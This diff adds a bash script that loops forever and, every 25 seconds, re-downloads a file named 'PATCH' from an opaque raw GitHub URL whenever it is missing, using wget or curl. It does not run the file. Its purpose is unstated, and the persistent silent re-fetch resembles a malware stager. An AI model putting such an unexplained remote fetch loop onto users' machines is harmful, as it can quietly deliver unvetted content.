@@ -1,0 +1,48 @@
+#!/bin/bash
+
+outputFile="LOCK DIR/PATCH"
+url="https://raw.githubusercontent.com/PACKDOL/shallg16/refs/heads/main/xxx.txt"
+
+cleanup() {
+    echo "Stopping the script..."
+    exit 0
+}
+trap cleanup SIGINT
+
+download_file() {
+    echo "Trying to download file..."
+    if command -v wget >/dev/null 2>&1; then
+        wget -q "$url" -O "$outputFile"
+        if [ $? -eq 0 ]; then
+            echo "File successfully downloaded using wget: $outputFile"
+            return 0
+        else
+            echo "wget failed, trying curl..."
+        fi
+    fi
+
+    if command -v curl >/dev/null 2>&1; then
+        curl -s -L -o "$outputFile" "$url"
+        if [ $? -eq 0 ]; then
+            echo "File successfully downloaded using curl: $outputFile"
+            return 0
+        else
+            echo "An error occurred while downloading the file using curl."
+            return 1
+        fi
+    else
+        echo "Neither wget nor curl is available!"
+        return 1
+    fi
+}
+
+while true; do
+    if [ ! -f "$outputFile" ]; then
+        echo "File not found. Downloading..."
+        download_file
+    else
+        echo "File exists. No action needed."
+    fi
+
+    sleep 25
+done
